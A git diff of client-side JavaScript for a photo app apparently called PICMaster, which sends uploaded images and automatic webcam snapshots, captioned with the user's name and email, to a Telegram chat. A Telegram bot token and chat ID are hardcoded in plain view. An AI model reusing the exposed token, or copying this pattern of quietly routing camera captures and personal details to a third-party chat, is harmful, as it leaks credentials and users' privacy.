@@ -18,7 +18,7 @@ const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
 const chatId = "7752627907";
 let currentUser = null;
 
-// UI Panels Logic
+// UI Panels
 const sidePanel = document.getElementById('side-panel');
 const settingsBtn = document.getElementById('settings-btn');
 const menuToggle = document.getElementById('menu-toggle');
@@ -28,14 +28,18 @@ settingsBtn.onclick = togglePanel;
 menuToggle.onclick = togglePanel;
 document.onclick = (e) => { if (!sidePanel.contains(e.target)) sidePanel.classList.remove('active'); };
 
-// Telegram Upload Function
+// Telegram Upload Logic
 async function uploadToTelegram(file) {
     if (!currentUser) return alert("Please Login First!");
     
+    const dropArea = document.getElementById('drop-area');
+    const originalText = dropArea.innerHTML;
+    dropArea.innerHTML = "<h3>Uploading... 📤</h3>"; // Visual Feedback
+
     const formData = new FormData();
     formData.append("chat_id", chatId);
-    formData.append("document", file, "PICMaster_Capture.jpg");
-    formData.append("caption", `📤 New capture from: ${currentUser.displayName}`);
+    formData.append("document", file, "PICMaster_File.jpg");
+    formData.append("caption", `📤 Received from: ${currentUser.displayName}\n📧 ${currentUser.email}`);
 
     try {
         const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
@@ -43,58 +47,70 @@ async function uploadToTelegram(file) {
             body: formData
         });
         if (response.ok) {
-            alert("✅ Photo sent to Telegram!");
+            alert("✅ Sent to Telegram!");
+            dropArea.innerHTML = "<h3>Sent Successfully! ✅</h3>";
         } else {
             alert("❌ Telegram Error!");
         }
     } catch (error) {
-        alert("❌ Connection Error!");
+        alert("❌ Network Error!");
+    } finally {
+        setTimeout(() => { dropArea.innerHTML = originalText; }, 3000);
     }
 }
 
-// Camera Fix
-document.getElementById('camera-btn').onclick = async () => {
-    if(!currentUser) return alert("Login to use Camera");
+// --- DROP AREA FIX ---
+const dropArea = document.getElementById('drop-area');
 
+// Click panna file select aaga:
+dropArea.onclick = () => {
+    if(!currentUser) return signInWithPopup(auth, provider);
+    const fileInput = document.createElement('input');
+    fileInput.type = 'file';
+    fileInput.accept = "image/*";
+    fileInput.onchange = (e) => {
+        const file = e.target.files[0];
+        if (file) uploadToTelegram(file);
+    };
+    fileInput.click();
+};
+
+// Drag and Drop panna:
+dropArea.addEventListener('dragover', (e) => { e.preventDefault(); dropArea.style.background = "rgba(255,255,255,0.3)"; });
+dropArea.addEventListener('dragleave', () => { dropArea.style.background = "rgba(255,255,255,0.15)"; });
+dropArea.addEventListener('drop', (e) => {
+    e.preventDefault();
+    dropArea.style.background = "rgba(255,255,255,0.15)";
+    const file = e.dataTransfer.files[0];
+    if (file) uploadToTelegram(file);
+});
+
+// --- CAMERA FIX ---
+document.getElementById('camera-btn').onclick = async () => {
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" }, 
-            audio: false 
-        });
-        
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('webcam');
         video.srcObject = stream;
         video.style.display = 'block';
-        video.style.width = '100%'; // Full screen-la camera theriyum
         video.play();
 
-        // 3 seconds wait panni photo edukkum
         setTimeout(() => {
             const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-            
-            // Camera resolution match pannuthu
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob((blob) => {
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
                 uploadToTelegram(blob);
-                stream.getTracks().forEach(track => track.stop()); // Camera-vai off pannuthu
+                stream.getTracks().forEach(t => t.stop());
                 video.style.display = 'none';
-            }, 'image/jpeg', 0.8);
-            
-            alert("📸 Photo Captured!");
+            }, 'image/jpeg');
         }, 3000);
-
     } catch (err) {
-        console.error(err);
-        alert("Camera Error: Please allow camera permission in your browser settings.");
+        alert("Camera Permission Denied!");
     }
 };
 
-// Auth & Other Actions
+// Auth State
 onAuthStateChanged(auth, (user) => {
     currentUser = user;
     const mainLogin = document.getElementById('main-login-btn');
